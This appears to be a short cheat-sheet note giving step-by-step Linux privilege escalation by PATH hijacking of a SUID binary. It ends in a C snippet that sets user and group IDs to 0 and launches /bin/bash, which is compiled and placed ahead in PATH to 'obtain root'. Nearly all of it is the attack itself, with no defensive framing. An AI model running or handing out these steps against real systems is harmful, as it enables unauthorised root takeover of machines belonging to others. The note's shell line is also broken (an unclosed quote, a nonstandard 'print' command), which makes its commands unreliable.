// find all env variables on the Linux system and observe if there are vulnerable binaries with Owner Permission SUID set to 'rws' / -perm -04000
// use Linux 'strings' function to see if the vulnerable binary starts any services when run
// use 'print $PATH' to find execution path for service of this vulnerable binary



// echo a simple C file for linux priv esc that will execute when $PATH of vulnerabl env variable is called
echo 'int main () { setgid(0); setuid(0); system("/bin/bash"); return 0;} > /dir_where_$PATH_goes_to_execute_vulnerable_bin/name_of_file.c



// compile file: gcc /dir_where_$PATH_goes_to_execute_vulnerable_bin/name_of_file.c
// update the env variable of $PATH to the folder of our malicious file: export PATH=/dir_where_$PATH_goes_to_execute_vulnerable_bin:$PATH
// run the file path of the vulnerable binary on the CLI: /usr/local/bin/vulnerable_bin
// obtain root
